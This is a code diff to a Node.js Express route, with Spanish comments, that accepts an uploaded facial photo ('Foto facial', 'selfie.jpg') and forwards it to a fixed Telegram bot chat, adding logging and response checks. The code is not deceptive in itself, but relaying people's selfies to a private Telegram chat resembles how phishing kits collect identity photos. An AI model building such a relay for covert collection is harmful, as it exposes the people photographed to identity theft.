@@ -194,27 +194,38 @@ app.post('/enviar-foto', async (req, res) => {
         const caption = req.body.caption || 'Foto facial';
 
         if (!photo) {
+            console.log('❌ No se recibió archivo photo en req.files');
             return res.status(400).send('No se recibió la foto');
         }
 
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: (() => {
-                const form = new FormData();
-                form.append('chat_id', CHAT_ID);
-                form.append('photo', photo.data, {
-                    filename: photo.name,
-                    contentType: photo.mimetype
-                });
-                form.append('caption', caption);
-                form.append('parse_mode', 'HTML');
-                return form;
-            })()
+        console.log('✅ Foto recibida:', photo.name, 'Tamaño:', photo.size, 'bytes');
+
+        // Convertir el buffer a Blob-like para Telegram
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', caption);
+        formData.append('parse_mode', 'HTML');
+        formData.append('photo', photo.data, {
+            filename: photo.name || 'selfie.jpg',
+            contentType: photo.mimetype || 'image/jpeg'
         });
+
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+
+        const result = await response.json();
+
+        if (result.ok) {
+            console.log('✅ Foto enviada correctamente a Telegram');
+        } else {
+            console.log('❌ Error de Telegram:', result);
+        }
 
         res.sendStatus(200);
     } catch (error) {
-        console.error('Error enviando foto a Telegram:', error);
+        console.error('🔥 Error crítico en /enviar-foto:', error);
         res.sendStatus(500);
     }
 });
